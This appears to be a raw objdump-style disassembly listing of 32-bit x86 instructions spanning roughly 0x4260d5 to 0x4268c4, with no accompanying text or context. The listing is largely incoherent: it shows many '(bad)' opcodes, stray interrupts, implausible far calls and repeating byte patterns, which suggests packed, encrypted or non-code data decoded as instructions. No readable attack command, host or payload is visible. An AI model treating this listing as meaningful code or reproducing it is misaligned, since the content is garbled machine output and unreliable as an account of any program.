  4260d5:	push   ebx
  4260d6:	aad    0x87
  4260d8:	adc    ecx,ebp
  4260da:	xchg   esi,eax
  4260db:	cmc    
  4260dc:	sar    DWORD PTR [ecx-0x62932d8],cl
  4260e2:	das    
  4260e3:	inc    ebp
  4260e4:	sti    
  4260e5:	xchg   edx,eax
  4260e6:	shr    edi,cl
  4260e8:	xchg   edx,eax
  4260e9:	int    0xd6
  4260eb:	cmc    
  4260ec:	cmp    ebx,ecx
  4260ee:	int    0xe6
  4260f0:	stc    
  4260f1:	cmp    eax,DWORD PTR [eax]
  4260f3:	push   ebx
  4260f4:	fld    DWORD PTR [edi+0x707113]
  4260fa:	(bad)  
  4260fb:	dec    esp
  4260fc:	sar    DWORD PTR [ecx-0x12c242d8],cl
  426102:	add    BYTE PTR [eax],al
  426104:	int    0x76
  426106:	or     eax,0xcb63a8aa
  42610b:	rcl    BYTE PTR [eax-0x80],cl
  42610e:	xchg   esi,eax
  42610f:	int    0xed
  426111:	add    al,0xed
  426113:	inc    esp
  426114:	pop    ebx
  426115:	cwde   
  426116:	call   0x76c9:0xcb3bdd3b
  42611d:	popf   
  42611e:	(bad)  
  42611f:	aaa    
  426120:	ficom  WORD PTR [ebx]
  426122:	pop    ebp
  426123:	mov    ebp,0xa25230a
  426128:	jbe    0x4260cf
  42612a:	leave  
  42612b:	jbe    0x4260ea
  42612d:	xchg   ecx,eax
  42612e:	aaa    
  42612f:	ficom  WORD PTR [ebx]
  426131:	or     dh,BYTE PTR [esi-0x13]
  426134:	leave  
  426135:	jbe    0x426124
  426137:	dec    ecx
  426138:	mov    al,ds:0x76c93586
  42613d:	cmc    
  42613e:	dec    ecx
  42613f:	lahf   
  426140:	xchg   BYTE PTR ds:0x691176c9,dh
  426146:	and    DWORD PTR [esi+0x1176c935],eax
  42614c:	cmp    DWORD PTR [ecx],esp
  42614e:	xchg   BYTE PTR ds:0x49f976c9,dh
  426154:	and    DWORD PTR [ebp+esi*1+0xa8476cf],eax
  42615b:	jbe    0x426156
  42615d:	int    0x76
  42615f:	sbb    al,0xcd
  426161:	shl    BYTE PTR ds:0xcd808081,1
  426167:	jbe    0x426185
  426169:	int    0x8d
  42616b:	sbb    al,0xcd
  42616d:	add    DWORD PTR ds:0xcd808081,ebp
  426173:	xor    ch,cl
  426175:	pop    esp
  426176:	xchg   eax,esp
  426178:	fs int 0x96
  42617b:	popf   
  42617c:	int    0xa
  42617e:	and    eax,0xa808081
  426183:	out    0xb5,al
  426185:	int    0xe6
  426187:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426188:	das    
  426189:	inc    ebp
  42618a:	add    edx,DWORD PTR [edx-0x326def2d]
  426190:	out    0x9d,al
  426192:	int    0xa6
  426194:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426195:	adc    bh,bl
  426197:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426198:	mov    esi,0xdd3b4229
  42619d:	shr    ecx,cl
  42619f:	sub    ch,cl
  4261a1:	pop    esi
  4261a2:	push   ebx
  4261a3:	aad    0x43
  4261a5:	(bad)  
  4261a7:	nop
  4261a8:	int    0x18
  4261aa:	or     dl,BYTE PTR [esi+0x1496cdf9]
  4261b0:	int    0x96
  4261b2:	xor    ch,cl
  4261b4:	xchg   esi,eax
  4261b5:	dec    esp
  4261b6:	iret   
  4261b7:	xchg   esi,eax
  4261b8:	lods   eax,DWORD PTR ds:[esi]
  4261b9:	bound  eax,QWORD PTR [eax]
  4261bb:	(bad)  
  4261bc:	stc    
  4261bd:	jno    0x42622f
  4261bf:	cwde   
  4261c0:	add    dh,dl
  4261c2:	sbb    al,0xcf
  4261c4:	jbe    0x42617b
  4261c6:	add    dh,dl
  4261c8:	mov    BYTE PTR [eax],al
  4261ca:	(bad)  
  4261cb:	cmc    
  4261cc:	add    dh,dl
  4261ce:	adc    DWORD PTR [eax],eax
  4261d0:	(bad)  
  4261d1:	in     eax,dx
  4261d2:	jo     0x4261a3
  4261d4:	jbe    0x4261d3
  4261d6:	jo     0x426195
  4261d8:	stos   BYTE PTR es:[edi],al
  4261d9:	clc    
  4261da:	add    BYTE PTR [eax],al
  4261dc:	or     dh,BYTE PTR [esi+0x1c]
  4261df:	int    0x76
  4261e1:	sbb    al,0xcd
  4261e3:	lea    esp,[edx+ecx*1]
  4261e6:	outs   dx,BYTE PTR ds:[esi]
  4261e7:	adc    al,0xcd
  4261e9:	jbe    0x42620f
  4261eb:	leave  
  4261ec:	add    BYTE PTR [edi-0x327f7f80],0x76
  4261f3:	lods   eax,DWORD PTR ds:[esi]
  4261f4:	int    0x8d
  4261f6:	and    al,0xa
  4261f8:	outs   dx,BYTE PTR ds:[esi]
  4261f9:	test   ch,cl
  4261fb:	jbe    0x42622d
  4261fd:	int    0x8d
  4261ff:	and    al,0xa
  426201:	outs   dx,BYTE PTR ds:[esi]
  426202:	mov    ch,cl
  426204:	jbe    0x42621a
  426206:	int    0x8d
  426208:	and    al,0xa
  42620a:	outs   dx,BYTE PTR ds:[esi]
  42620b:	dec    esp
  42620c:	int    0x76
  42620e:	and    al,0xc9
  426210:	ins    BYTE PTR es:[edi],dx
  426211:	and    al,0x81
  426213:	add    BYTE PTR [eax-0x32e11380],0x76
  42621a:	sbb    al,0xcd
  42621c:	lea    ebx,[ecx*8-0x7f7ed2ff]
  426223:	or     ch,0xa
  426226:	and    eax,0xcd808081
  42622b:	xor    BYTE PTR [ebx],0x81
  42622e:	or     dh,BYTE PTR [esi-0x3]
  426231:	int    0x76
  426233:	std    
  426234:	stos   BYTE PTR es:[edi],al
  426235:	test   al,0x63
  426237:	retf   
  426238:	rcr    BYTE PTR [eax+eax*4],cl
  42623b:	xchg   esi,eax
  42623c:	int    0xed
  42623e:	int    0x76
  426240:	dec    esp
  426241:	adc    ch,ch
  426243:	cmp    eax,0x5b808081
  426248:	cwde   
  426249:	call   0x2f35:0x86214966
  426250:	push   es
  426251:	mov    ecx,0xcd80804a
  426256:	jbe    0x426288
  426258:	inc    cx
  42625a:	and    DWORD PTR [esi-0x62f9d0cb],eax
  426260:	dec    edx
  426261:	add    BYTE PTR [eax-0x29128937],0x37
  426268:	ficom  WORD PTR [ebx]
  42626a:	pop    ebp
  42626b:	mov    ebp,0xa25230a
  426270:	jbe    0x426283
  426272:	leave  
  426273:	jbe    0x42622a
  426275:	xchg   ecx,eax
  426276:	aaa    
  426277:	ficom  WORD PTR [ebx]
  426279:	or     dh,BYTE PTR [esi-0x43]
  42627c:	int    0x76
  42627e:	mov    BYTE PTR [edx],cl
  426280:	jbe    0x426277
  426282:	int    0x76
  426284:	cmc    
  426285:	int    0x1
  426287:	mov    ebp,0xcd808081
  42628c:	or     ch,0x80
  42628f:	or     dh,BYTE PTR [esi-0x7]
  426292:	pop    edi
  426293:	jle    0x4262ca
  426295:	add    BYTE PTR [eax-0x7fca69a3],0x80
  42629c:	mov    eax,0x4b0760a
  4262a1:	ins    DWORD PTR es:[edi],dx
  4262a2:	(bad)  
  4262a3:	mov    eax,0xcda2760a
  4262a8:	sar    DWORD PTR [eax+0x5d15760a],cl
  4262ae:	(bad)  
  4262af:	xor    eax,0xf1cd8080
  4262b4:	mov    eax,0xcf19960a
  4262b9:	nop
  4262ba:	xchg   edx,eax
  4262bb:	iret   
  4262bc:	sahf   
  4262bd:	(bad)  
  4262be:	int    0x99
  4262c0:	mov    eax,0xcd1d960a
  4262c5:	aad    0xb8
  4262c7:	or     dl,BYTE PTR [esi-0x662dfbdf]
  4262cd:	mov    eax,0xcf01960a
  4262d2:	jno    0x426328
  4262d4:	int    0x3
  4262d6:	mov    eax,0x40be60a
  4262db:	leave  
  4262dc:	xchg   ebp,eax
  4262dd:	mov    eax,0xcf05e60a
  4262e2:	ficomp WORD PTR [eax-0x48]
  4262e5:	or     ah,dh
  4262e7:	pop    es
  4262e8:	mov    eax,0xb809760a
  4262ed:	or     dl,dh
  4262ef:	retf   0xc5cd
  4262f2:	mov    eax,0xb8cc760a
  4262f7:	or     dl,BYTE PTR [edi]
  4262f9:	ins    BYTE PTR es:[edi],dx
  4262fa:	add    BYTE PTR [eax],al
  4262fc:	add    BYTE PTR [ebp*2+0x60ab8d0],al
  426303:	push   edx
  426304:	add    BYTE PTR [eax],al
  426306:	add    bh,cl
  426308:	outs   dx,BYTE PTR ds:[esi]
  426309:	add    edi,DWORD PTR [eax+0x74060a]
  42630f:	add    BYTE PTR [eax],al
  426311:	add    al,0x6d
  426313:	inc    edx
  426314:	mov    eax,0x78060a
  426319:	add    BYTE PTR [eax],al
  42631b:	iret   
  42631c:	outs   dx,BYTE PTR ds:[esi]
  42631d:	xor    BYTE PTR [eax+0x7c060a],bh
  426323:	add    BYTE PTR [eax],al
  426325:	add    al,0x6d
  426327:	xor    bh,BYTE PTR [eax+0x8a060a]
  42632d:	add    BYTE PTR [eax],al
  42632f:	mov    eax,0x8ccf0a
  426334:	add    BYTE PTR [eax],al
  426336:	int    0xc5
  426338:	mov    eax,0x8e060a
  42633d:	add    BYTE PTR [eax],al
  42633f:	int    0x76
  426341:	in     eax,dx
  426342:	int    0x8d
  426344:	adc    DWORD PTR [edi],ebp
  426346:	inc    ebp
  426347:	jge    0x4262db
  426349:	shr    ebx,cl
  42634b:	xchg   edx,eax
  42634c:	int    0x8d
  42634e:	in     eax,dx
  42634f:	int    0x96
  426351:	adc    ebx,eax
  426353:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426354:	mov    esi,0xc93b4229
  426359:	cmp    ebx,edx
  42635b:	shl    edx,cl
  42635d:	sub    BYTE PTR [ebx-0x2e],dl
  426360:	in     al,dx
  426361:	outs   dx,BYTE PTR ds:[esi]
  426362:	iret   
  426363:	aam    0x76
  426365:	mov    al,0xb8
  426367:	int    0x4e
  426369:	das    
  42636a:	mov    ebx,0xcbbb2f18
  42636f:	cmp    ecx,DWORD PTR [edx+edx*1]
  426372:	sti    
  426373:	and    DWORD PTR ds:0xf3e38080,esi
  426379:	shl    edx,cl
  42637b:	das    
  42637c:	push   ebx
  42637d:	adc    ecx,DWORD PTR [ecx]
  42637f:	int3   
  426380:	test   DWORD PTR [ebp-0x32ffff01],esp
  426386:	lea    esi,[ebp+0x2fbd96cd]
  42638c:	inc    ebp
  42638d:	jecxz  0x426321
  42638f:	shl    ebx,cl
  426391:	xchg   edx,eax
  426392:	int    0x96
  426394:	mov    ch,0xcd
  426396:	(bad)  
  426397:	mov    ebp,0xf73bf03b
  42639c:	push   ebx
  42639d:	psrlq  mm5,mm2
  4263a0:	sub    BYTE PTR [edi-0x7906fb2d],al
  4263a6:	(bad)  
  4263a7:	popa   
  4263a8:	int    0x76
  4263aa:	in     eax,dx
  4263ab:	int    0x8d
  4263ad:	adc    DWORD PTR [edi],ebp
  4263af:	inc    ebp
  4263b0:	jge    0x426344
  4263b2:	shr    ebx,cl
  4263b4:	xchg   edx,eax
  4263b5:	int    0x8d
  4263b7:	in     eax,dx
  4263b8:	int    0x96
  4263ba:	adc    DWORD PTR [ebx],edi
  4263bc:	leave  
  4263bd:	cmp    ebx,edx
  4263bf:	shl    edx,cl
  4263c1:	sub    BYTE PTR [ebx-0x2e],dl
  4263c4:	in     al,dx
  4263c5:	outs   dx,BYTE PTR ds:[esi]
  4263c6:	iret   
  4263c7:	aam    0x76
  4263c9:	add    DWORD PTR [eax-0x44d0b133],edi
  4263cf:	sbb    BYTE PTR [edi],ch
  4263d1:	mov    ebx,0x120c3bcb
  4263d6:	sti    
  4263d7:	and    DWORD PTR ds:0xf3e38080,esi
  4263dd:	shl    edx,cl
  4263df:	das    
  4263e0:	push   ebx
  4263e1:	adc    ecx,DWORD PTR [ecx]
  4263e3:	int3   
  4263e4:	test   esp,ecx
  4263e6:	inc    DWORD PTR [eax]
  4263e8:	add    ch,cl
  4263ea:	lea    esi,[ebp+0x2fbd96cd]
  4263f0:	inc    ebp
  4263f1:	jecxz  0x426385
  4263f3:	shl    ebx,cl
  4263f5:	xchg   edx,eax
  4263f6:	int    0x96
  4263f8:	mov    ch,0xcd
  4263fa:	(bad)  
  4263fb:	mov    ebp,0xf73bf03b
  426400:	push   ebx
  426401:	psrlq  mm5,mm2
  426404:	sub    BYTE PTR [edi-0x7406fb2d],al
  42640a:	(bad)  
  42640b:	popa   
  42640c:	int    0x76
  42640e:	in     eax,dx
  42640f:	int    0x8d
  426411:	adc    DWORD PTR [edi],ebp
  426413:	inc    ebp
  426414:	jge    0x4263a8
  426416:	shr    ebx,cl
  426418:	xchg   edx,eax
  426419:	int    0x8d
  42641b:	in     eax,dx
  42641c:	int    0x96
  42641e:	adc    DWORD PTR [ebx],edi
  426420:	leave  
  426421:	cmp    ebx,edx
  426423:	shl    edx,cl
  426425:	sub    BYTE PTR [ebx-0x2e],dl
  426428:	in     al,dx
  426429:	je     0x4263fa
  42642b:	push   ebp
  42642c:	jbe    0x42649a
  42642e:	add    BYTE PTR [eax],al
  426430:	add    BYTE PTR [eax-0x44d0b133],bh
  426436:	sbb    BYTE PTR [edi],ch
  426438:	mov    ebx,0x120c3bcb
  42643d:	sti    
  42643e:	and    DWORD PTR ds:0xf3e38080,esi
  426444:	shl    edx,cl
  426446:	das    
  426447:	push   ebx
  426448:	adc    ecx,DWORD PTR [ecx]
  42644a:	int3   
  42644b:	test   DWORD PTR ds:0xcd0000ff,eax
  426451:	lea    esi,[ebp+0x2fbd96cd]
  426457:	inc    ebp
  426458:	jecxz  0x4263ec
  42645a:	shl    ebx,cl
  42645c:	xchg   edx,eax
  42645d:	int    0x96
  42645f:	mov    ch,0xcd
  426461:	(bad)  
  426462:	mov    ebp,0xf73bf03b
  426467:	push   ebx
  426468:	psrlq  mm5,mm2
  42646b:	sub    BYTE PTR [edi-0x7706fb2d],al
  426471:	(bad)  
  426472:	mov    ebx,0xffb506cf
  426477:	add    BYTE PTR [eax],al
  426479:	or     dh,BYTE PTR [esi-0x7]
  42647c:	int    0x76
  42647e:	stc    
  42647f:	pop    edi
  426480:	inc    esi
  426481:	pop    esp
  426482:	inc    ebp
  426483:	xchg   edi,eax
  426484:	or     cl,BYTE PTR [eax+0x79245161]
  42648a:	daa    
  42648b:	or     dh,BYTE PTR [eax-0x7c]
  42648e:	int    0x6
  426490:	mov    ch,0xff
  426492:	add    BYTE PTR [eax],al
  426494:	int    0x57
  426496:	mov    ebp,0xa0000ff
  42649b:	(bad)  
  42649c:	mov    ebp,0x8621d169
  4264a1:	xor    eax,0x62fd343
  4264a6:	pusha  
  4264a7:	add    DWORD PTR [eax-0x4269a180],0x8151062f
  4264b1:	add    BYTE PTR [eax-0x7fca76a3],0x80
  4264b8:	mov    eax,0xfff9060a
  4264bd:	add    BYTE PTR [eax],al
  4264bf:	int    0xc5
  4264c1:	mov    eax,0xff03060a
  4264c6:	add    BYTE PTR [eax],al
  4264c8:	pop    ebp
  4264c9:	es xor eax,0xab88080
  4264cf:	push   es
  4264d0:	std    
  4264d1:	inc    DWORD PTR [eax]
  4264d3:	add    BYTE PTR [ebp-0x5d],bl
  4264d6:	xor    eax,0xab88080
  4264db:	push   es
  4264dc:	(bad)  
  4264dd:	inc    DWORD PTR [eax]
  4264df:	add    BYTE PTR [ebp+0x1e],bl
  4264e2:	xor    eax,0xab88080
  4264e7:	push   es
  4264e8:	add    BYTE PTR [eax],0x0
  4264eb:	add    BYTE PTR [ebp*2-0x47823218],al
  4264f2:	or     cl,bh
  4264f4:	xchg   edx,eax
  4264f5:	add    BYTE PTR [eax],al
  4264f7:	add    ch,cl
  4264f9:	jbe    0x42652b
  4264fb:	pop    edi
  4264fc:	dec    ebx
  4264fd:	xor    eax,0xab88080
  426502:	iret   
  426503:	test   BYTE PTR [eax],al
  426505:	add    BYTE PTR [eax],al
  426507:	add    al,0xd3
  426509:	bound  edi,QWORD PTR [eax+0x86cf0a]
  42650f:	add    BYTE PTR [eax],al
  426511:	pop    edi
  426512:	push   esi
  426513:	xor    eax,0xab88080
  426518:	iret   
  426519:	mov    BYTE PTR [eax],al
  42651b:	add    BYTE PTR [eax],al
  42651d:	add    al,0xd3
  42651f:	pushf  
  426520:	mov    eax,0x4acf0a
  426525:	add    BYTE PTR [eax],al
  426527:	int    0xc
  426529:	mov    eax,0x4ccf0a
  42652e:	add    BYTE PTR [eax],al
  426530:	pop    edi
  426531:	add    al,0x35
  426533:	add    BYTE PTR [eax+0x4ecf0ab8],0x0
  42653a:	add    BYTE PTR [eax],al
  42653c:	cmp    edi,DWORD PTR [ecx+0x5f]
  42653f:	adc    DWORD PTR [eax-0x80],edx
  426542:	cmp    BYTE PTR [eax+0x30cf0a],0x0
  426549:	add    bl,dl
  42654b:	mov    ebp,0x151a5f92
  426550:	add    BYTE PTR [eax+0x22cf0ab8],0x0
  426557:	add    BYTE PTR [eax],al
  426559:	pop    edi
  42655a:	call   0xcf0a:0xb88080eb
  426561:	adc    al,0x0
  426563:	add    BYTE PTR [eax],al
  426565:	int    0x8d
  426567:	xor    BYTE PTR [edx+eax*1],al
  42656a:	call   ebx
  42656c:	repnz sub BYTE PTR [ebx-0x2d],dl
  426570:	or     al,BYTE PTR [esi]
  426572:	adc    eax,0xcd0000ff
  426577:	jbe    0x4265c5
  426579:	int    0x8d
  42657b:	dec    esp
  42657c:	cmp    edi,DWORD PTR [ecx-0x2d]
  42657f:	mov    ebp,0xff020492
  426584:	shl    edx,cl
  426586:	sub    BYTE PTR [ebx-0x2d],dl
  426589:	leave  
  42658a:	add    eax,0xff1d06
  42658f:	add    BYTE PTR [eax],al
  426591:	add    BYTE PTR [eax+0x1506cf80],al
  426597:	inc    DWORD PTR [eax]
  426599:	add    BYTE PTR [eax-0x33],dh
  42659c:	jbe    0x4265ce
  42659e:	int    0x8d
  4265a0:	xor    BYTE PTR [ebx],bh
  4265a2:	jns    0x426577
  4265a4:	mov    ebp,0xff020492
  4265a9:	shl    edx,cl
  4265ab:	sub    BYTE PTR [ebx-0x2d],dl
  4265ae:	jo     0x42657f
  4265b0:	push   es
  4265b1:	stc    
  4265b2:	inc    DWORD PTR [eax]
  4265b4:	add    BYTE PTR [eax-0x33],dh
  4265b7:	jbe    0x4265ae
  4265b9:	int    0x1
  4265bb:	cmp    eax,0xc9808081
  4265c0:	push   es
  4265c1:	sbb    BYTE PTR [eax],al
  4265c3:	add    BYTE PTR [eax],al
  4265c5:	inc    eax
  4265c6:	retf   
  4265c7:	fwait
  4265c8:	xor    eax,0x76cd5000
  4265cd:	adc    al,0x0
  4265cf:	icebp  
  4265d0:	or     dh,BYTE PTR [esi-0x7]
  4265d3:	int    0x76
  4265d5:	stc    
  4265d6:	push   es
  4265d7:	ins    DWORD PTR es:[edi],dx
  4265d8:	aam    0x4a
  4265da:	adc    dl,BYTE PTR [esi+0x68]
  4265dd:	or     BYTE PTR [ebx+ecx*1],bl
  4265e0:	fmul   QWORD PTR [ebx-0x17]
  4265e3:	(bad)  
  4265e4:	int    0x8d
  4265e6:	dec    esp
  4265e7:	int    0x96
  4265e9:	dec    esp
  4265ea:	sar    bh,0x3b
  4265ed:	setl   BYTE PTR [ebx]
  4265f0:	icebp  
  4265f1:	shr    edx,cl
  4265f3:	sub    bl,dl
  4265f5:	jmp    0x426589
  4265f7:	push   ebx
  4265f8:	adc    ecx,ebp
  4265fa:	xchg   esi,eax
  4265fb:	cmc    
  4265fc:	int    0xa2
  4265fe:	and    eax,0x5e808081
  426603:	dec    edx
  426604:	das    
  426605:	push   es
  426606:	popa   
  426607:	test   DWORD PTR [eax+0x4c8dcd80],eax
  42660d:	int    0x96
  42660f:	dec    esp
  426610:	cmp    ecx,DWORD PTR [edi]
  426612:	shr    ebx,cl
  426614:	xchg   edx,eax
  426615:	cmp    esi,ecx
  426617:	shr    edx,cl
  426619:	sub    BYTE PTR [ebx+0x13],dl
  42661c:	int    0x96
  42661e:	cmc    
  42661f:	int    0xa2
  426621:	in     al,0x81
  426623:	add    BYTE PTR [eax-0x7232b5f6],0x4c
  42662a:	int    0x96
  42662c:	dec    esp
  42662d:	cmp    ecx,DWORD PTR [edi]
  42662f:	shr    ebx,cl
  426631:	xchg   edx,eax
  426632:	cmp    esi,ecx
  426634:	shr    edx,cl
  426636:	sub    BYTE PTR [ebx+0x13],dl
  426639:	int    0x96
  42663b:	cmc    
  42663c:	int    0xa2
  42663e:	add    DWORD PTR [ecx+0x4a0a8080],eax
  426644:	pop    edi
  426645:	xor    ax,0x8080
  426649:	mov    eax,0x24cf0a
  42664e:	add    BYTE PTR [eax],al
  426650:	int    0xc
  426652:	mov    eax,0x28cf0a
  426657:	add    BYTE PTR [eax],al
  426659:	pop    edi
  42665a:	es xor eax,0xab88080
  426660:	iret   
  426661:	sub    al,0x0
  426663:	add    BYTE PTR [eax],al
  426665:	pop    edi
  426666:	daa    
  426667:	xor    eax,0xab88080
  42666c:	iret   
  42666d:	xor    al,BYTE PTR [eax]
  42666f:	add    BYTE PTR [eax],al
  426671:	add    al,0xd3
  426673:	test   eax,0x34cf0ab8
  426678:	add    BYTE PTR [eax],al
  42667a:	add    BYTE PTR [edi-0x69],bl
  42667d:	xor    eax,0xab88080
  426682:	iret   
  426683:	cmp    BYTE PTR [eax],al
  426685:	add    BYTE PTR [eax],al
  426687:	add    al,0xd3
  426689:	mov    dl,0xb8
  42668b:	or     cl,bh
  42668d:	cmp    al,0x0
  42668f:	add    BYTE PTR [eax],al
  426691:	pop    edi
  426692:	fwait
  426693:	xor    eax,0xab88080
  426698:	iret   
  426699:	inc    eax
  42669a:	add    BYTE PTR [eax],al
  42669c:	add    ch,cl
  42669e:	or     al,0xb8
  4266a0:	or     cl,bh
  4266a2:	inc    esp
  4266a3:	add    BYTE PTR [eax],al
  4266a5:	add    BYTE PTR [edi+0x17],bl
  4266a8:	xor    eax,0xab88080
  4266ad:	iret   
  4266ae:	dec    eax
  4266af:	add    BYTE PTR [eax],al
  4266b1:	add    BYTE PTR [edi+0x26],bl
  4266b4:	pop    esi
  4266b5:	add    BYTE PTR [eax+0x50cf0ab8],0x0
  4266bc:	add    BYTE PTR [eax],al
  4266be:	pop    edi
  4266bf:	cmp    esi,DWORD PTR [edx]
  4266c1:	add    BYTE PTR [eax+0x42cf0ab8],0x0
  4266c8:	add    BYTE PTR [eax],al
  4266ca:	jns    0x426742
  4266cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4266cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4266ce:	pop    edi
  4266cf:	pop    esp
  4266d0:	adc    eax,0xab88080
  4266d5:	iret   
  4266d6:	push   esp
  4266d7:	add    BYTE PTR [eax],al
  4266d9:	add    BYTE PTR [ebx+edx*8],al
  4266dc:	pop    esp
  4266dd:	mov    eax,0x58cf0a
  4266e2:	add    BYTE PTR [eax],al
  4266e4:	jns    0x42675c
  4266e6:	fisttp WORD PTR [ecx+0x79]
  4266e9:	jbe    0x426694
  4266eb:	inc    ecx
  4266ec:	jns    0x426764
  4266ee:	loope  0x426693
  4266f0:	pop    edi
  4266f1:	fcom   st(4)
  4266f3:	add    BYTE PTR [eax+0x5ccf0ab8],0x0
  4266fa:	add    BYTE PTR [eax],al
  4266fc:	jns    0x426774
  4266fe:	lods   eax,DWORD PTR ds:[esi]
  4266ff:	push   edi
  426700:	pop    edi
  426701:	jnp    0x426758
  426703:	add    BYTE PTR [eax+0x60cf0ab8],0x0
  42670a:	add    BYTE PTR [eax],al
  42670c:	jns    0x426784
  42670e:	repnz cmp DWORD PTR [ecx+0x76],edi
  426712:	jmp    0x8080:0x35a15f47
  426719:	mov    eax,0x64cf0a
  42671e:	add    BYTE PTR [eax],al
  426720:	jns    0x426798
  426722:	in     eax,0x18
  426724:	int    0x8d
  426726:	xor    ch,cl
  426728:	xchg   esi,eax
  426729:	xor    BYTE PTR [ebx],bh
  42672b:	(bad)  
  42672d:	icebp  
  42672e:	shr    ebx,cl
  426730:	xchg   edx,eax
  426731:	shr    edx,cl
  426733:	sub    BYTE PTR [ebx+0x13],dl
  426736:	in     al,dx
  426737:	xchg   esp,eax
  426738:	int    0x96
  42673a:	xor    ch,cl
  42673c:	out    0x30,al
  42673e:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  426744:	stc    
  426745:	shr    ecx,cl
  426747:	sub    BYTE PTR [ebx-0x27],dl
  42674a:	xor    edx,DWORD PTR [ebx]
  42674c:	das    
  42674d:	pop    ecx
  42674e:	mov    WORD PTR [ebp-0x5b],cs
  426751:	int    0x96
  426753:	xor    ch,cl
  426755:	out    0x30,al
  426757:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  42675d:	stc    
  42675e:	shr    ecx,cl
  426760:	sub    BYTE PTR [ebx-0x27],dl
  426763:	int    0xe6
  426765:	stc    
  426766:	add    al,0x2
  426768:	adc    DWORD PTR [edx],0xffffffd3
  42676b:	fwait
  42676c:	add    BYTE PTR [eax+0x9033380],0x8c
  426773:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  426775:	int    0x96
  426777:	xor    ch,cl
  426779:	lea    esi,[eax]
  42677b:	cmp    ebx,DWORD PTR [ecx-0xd2c82c5]
  426781:	sub    bl,dl
  426783:	repz xchg edx,eax
  426785:	push   ebx
  426786:	jecxz  0x426755
  426788:	(bad)  
  426789:	stc    
  42678a:	xchg   DWORD PTR [ebx],edx
  42678c:	int    0x96
  42678e:	xor    ch,cl
  426790:	out    0x30,al
  426792:	cmp    ebx,DWORD PTR [ecx-0xc2c06c5]
  426798:	xchg   edx,eax
  426799:	shr    ecx,cl
  42679b:	sub    BYTE PTR [ebx-0x27],dl
  42679e:	add    al,0xd2
  4267a0:	mov    BYTE PTR [edx],cl
  4267a2:	(bad)  
  4267a3:	stc    
  4267a4:	inc    ebx
  4267a5:	adc    eax,DWORD PTR [edx+0x308dcdb0]
  4267ab:	int    0x96
  4267ad:	xor    BYTE PTR [ebx],bh
  4267af:	(bad)  
  4267b1:	icebp  
  4267b2:	shr    ebx,cl
  4267b4:	xchg   edx,eax
  4267b5:	shr    edx,cl
  4267b7:	sub    BYTE PTR [ebx+0x13],dl
  4267ba:	or     cl,bh
  4267bc:	adc    eax,0xcd0000ff
  4267c1:	lea    ecx,[ebp+ecx*8-0x6a]
  4267c5:	dec    esp
  4267c6:	cmp    ecx,DWORD PTR [edi]
  4267c8:	cmp    esi,ecx
  4267ca:	shr    edx,cl
  4267cc:	sub    bl,dl
  4267ce:	jmp    0x426762
  4267d0:	push   ebx
  4267d1:	adc    ecx,edi
  4267d3:	xchg   esi,eax
  4267d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4267d5:	or     dl,BYTE PTR ds:0xff1dcf
  4267db:	add    BYTE PTR [ecx+0x6b],ah
  4267de:	xor    eax,0x13cd8080
  4267e3:	mov    eax,0x4258d0a
  4267e8:	rcl    edx,cl
  4267ea:	int    0xfa
  4267ec:	mov    eax,0xcf29e60a
  4267f1:	loopne 0x42679c
  4267f3:	mov    eax,0x42de60a
  4267f8:	leave  
  4267f9:	test   BYTE PTR [eax-0x304d19f6],bh
  4267ff:	loopne 0x426815
  426801:	mov    eax,0x435e60a
  426806:	leave  
  426807:	loop   0x4267c1
  426809:	or     ah,dh
  42680b:	cmp    ebp,ecx
  42680d:	cli    
  42680e:	mov    eax,0xcd3de60a
  426813:	add    edi,DWORD PTR [eax-0x32be19f6]
  426819:	cld    
  42681a:	mov    eax,0xcd45e60a
  42681f:	add    edi,DWORD PTR [eax-0x322f19f6]
  426825:	cli    
  426826:	mov    eax,0xcfc2e60a
  42682b:	loopne 0x426856
  42682d:	mov    eax,0x455e60a
  426832:	leave  
  426833:	test   BYTE PTR [eax-0x30a619f6],bh
  426839:	loopne 0x4267d0
  42683b:	mov    eax,0x45de60a
  426840:	leave  
  426841:	loop   0x4267fb
  426843:	or     ah,dh
  426845:	popa   
  426846:	mov    eax,0xb8658d0a
  42684b:	or     dl,BYTE PTR [esi-0x47f33297]
  426851:	or     cl,BYTE PTR [ebp+0x4c8dcd6d]
  426857:	int    0x96
  426859:	dec    esp
  42685a:	cmp    esi,ecx
  42685c:	cmp    ecx,DWORD PTR [edi]
  42685e:	shr    edx,cl
  426860:	sub    bl,dl
  426862:	jmp    0x4267f6
  426864:	push   ebx
  426865:	adc    ecx,ebp
  426867:	xchg   esi,eax
  426868:	dec    esp
  426869:	int    0xe6
  42686b:	dec    esp
  42686c:	cmp    ebx,DWORD PTR [ecx-0x306d0c2d]
  426872:	mov    WORD PTR [ebp-0x2c06c430],cs
  426878:	jmp    0x301bbba5
  42687d:	mov    ebx,0xb8d93b5e
  426882:	or     dh,BYTE PTR [ecx]
  426884:	int    0x8d
  426886:	dec    esp
  426887:	int    0x96
  426889:	dec    esp
  42688a:	cmp    ecx,DWORD PTR [edi]
  42688c:	cmp    esi,ecx
  42688e:	shr    ebx,cl
  426890:	xchg   edx,eax
  426891:	shr    edx,cl
  426893:	sub    BYTE PTR [ebx+0x13],dl
  426896:	int    0x96
  426898:	dec    esp
  426899:	iret   
  42689a:	mov    WORD PTR [ebp-0x3266c4db],cs
  4268a0:	out    0x4c,al
  4268a2:	shl    ebx,cl
  4268a4:	xchg   edx,eax
  4268a5:	cmp    edi,ecx
  4268a7:	shr    ecx,cl
  4268a9:	sub    BYTE PTR [ebx-0x27],dl
  4268ac:	das    
  4268ad:	mov    ebx,0xb8d93b5e
  4268b2:	or     dh,BYTE PTR [ecx]
  4268b4:	int    0x8d
  4268b6:	dec    esp
  4268b7:	int    0x96
  4268b9:	dec    esp
  4268ba:	cmp    esi,ecx
  4268bc:	shr    edx,cl
  4268be:	sub    BYTE PTR [ebx],bh
  4268c0:	psrlq  mm5,mm3
  4268c3:	xchg   edx,eax
  4268c4:	push   ebx
